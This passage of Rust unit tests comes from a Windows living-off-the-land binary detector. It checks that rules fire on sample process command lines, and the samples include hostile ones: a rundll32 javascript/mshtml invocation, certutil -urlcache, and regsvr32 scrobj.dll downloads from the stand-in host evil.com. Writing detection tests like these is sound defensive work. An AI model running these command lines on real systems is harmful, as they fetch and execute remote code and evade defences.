        detector.add_rule(rule);
        assert_eq!(detector.rules.len(), initial_count + 1);

        assert!(detector.remove_rule("LB-CUSTOM"));
        assert_eq!(detector.rules.len(), initial_count);
        assert!(!detector.remove_rule("LB-CUSTOM"));
    }

    #[test]
    fn test_match_parent() {
        let patterns = vec![
            DetectionPattern::ParentProcessIs(vec!["explorer.exe".into()]),
        ];

        assert!(LolbinDetector::match_parent(&patterns, "explorer.exe"));
        assert!(!LolbinDetector::match_parent(&patterns, "cmd.exe"));
    }

    #[test]
    fn test_rundll32_javascript_detection() {
        let mut detector = LolbinDetector::new();
        let process = make_process(
            "rundll32.exe",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";o=CreateObject(\"Scripting.FileSystemObject\");o.GetSpecialFolder(2).Path;",
            7001,
            500,
        );
        let detections = detector.analyze_process_event(&process, None);
        assert!(!detections.is_empty(), "Should detect rundll32 with javascript");
        assert_eq!(detections[0].rule_id, "LB-004");
    }

    #[test]
    fn test_with_config_custom_exclusions() {
        let config = LolbinConfig {
            mode: LolbinMode::Block,
            excluded_paths: vec!["C:\\Program Files\\Legitimate".into()],
            ..Default::default()
        };
        let mut detector = LolbinDetector::with_config(config);

        let mut process = make_process(
            "certutil.exe",
            "certutil.exe -urlcache http://evil.com/file",
            8001,
            500,
        );
        process.path = "C:\\Program Files\\Legitimate\\certutil.exe".into();

        let detections = detector.analyze_process_event(&process, None);
        assert!(detections.is_empty(), "Should not flag excluded path");
    }

    #[test]
    fn test_regsvr32_scrobj_detection() {
        let mut detector = LolbinDetector::new();
        let process = make_process(
            "regsvr32.exe",
            "regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll",
            9001,
            500,
        );
        let detections = detector.analyze_process_event(&process, None);
        assert!(!detections.is_empty(), "Should detect regsvr32 with scrobj.dll");
        assert_eq!(detections[0].rule_id, "LB-003");
    }
}
